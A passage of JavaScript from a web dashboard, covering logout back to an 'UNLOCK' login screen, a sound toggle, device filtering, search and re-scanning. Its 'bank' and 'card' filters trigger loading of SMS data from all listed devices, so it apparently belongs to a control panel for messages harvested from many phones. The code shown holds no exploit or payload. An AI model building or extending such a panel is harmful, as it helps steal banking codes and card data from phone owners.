    if (S.detailStatusTimer){ clearInterval(S.detailStatusTimer); S.detailStatusTimer = null; }
    if (S.realtimeTimer){ clearInterval(S.realtimeTimer); S.realtimeTimer = null; }
    if (S.detailAbort){ try { S.detailAbort.abort(); } catch(e){} S.detailAbort = null; }
    S.selectedDev = null;
    document.getElementById('detailRoot').innerHTML = '';
    app.style.display = 'none';
    loginScreen.style.display = 'flex';
    box.classList.remove('flip-out');
    box.classList.add('flip-in');
    setTimeout(function(){ box.classList.remove('flip-in'); }, 700);
    pass.value = ''; btn.disabled = false; btn.textContent = 'UNLOCK';
    errEl.classList.remove('show');
    particlesActive = true;
    initParticles();
    setTimeout(function(){ pass.focus(); }, 400);
  };

  var sndBtn = document.getElementById('sndBtn');
  if (sndBtn){
    sndBtn.onclick = function(){
      var nowMuted = !SFX.isMuted();
      SFX.setMuted(nowMuted);
      sndBtn.classList.toggle('muted', nowMuted);
      sndBtn.textContent = nowMuted ? '🔇' : '🔊';
      if (!nowMuted) SFX.click();
    };
  }

  document.addEventListener('pointerdown', function prime(){
    SFX.prime();
    document.removeEventListener('pointerdown', prime);
  }, { once: true });
}

function bootDashboard(){
  S.stars = loadStars();
  hydrateCache();
  fetchAllDevices();
}

document.querySelectorAll('#filterbar button[data-f]').forEach(function(btn){
  btn.onclick = function(){
    var f = btn.getAttribute('data-f');
    document.querySelectorAll('#filterbar button[data-f]').forEach(function(b){ b.classList.remove('active'); });
    btn.classList.add('active');
    S.filter = f;
    renderDevices();
    if (f === 'bank' || f === 'card'){
      var needsLoad = Object.keys(S.smsData).length < S.devices.length;
      if (needsLoad){ toast('⚡ Loading SMS — updates live','warn'); prioritySmsLoad(); }
    }
  };
});

document.querySelectorAll('.stat-flip').forEach(function(cell){
  cell.onclick = function(){
    var f = cell.getAttribute('data-filter');
    if (!f) return;
    var btn = document.querySelector('#filterbar button[data-f="'+f+'"]');
    if (btn) btn.click();
  };
  cell.addEventListener('mouseleave', function(){ cell.classList.remove('flipped'); });
  cell.addEventListener('touchstart', function(){ cell.classList.toggle('flipped'); }, { passive: true });
});

document.getElementById('sortSel').onchange = function(){ S.sort = this.value; renderDevices(); };

var _searchTO;
document.getElementById('searchInput').oninput = function(){
  var self = this;
  clearTimeout(_searchTO);
  _searchTO = setTimeout(function(){ S.search = self.value.trim(); renderDevices(); }, 250);
};

document.getElementById('fabBtn').onclick = function(){
  toast('🔄 Re-scanning all nodes…','warn');
  fetchAllDevices();
};

initLogin();

})();
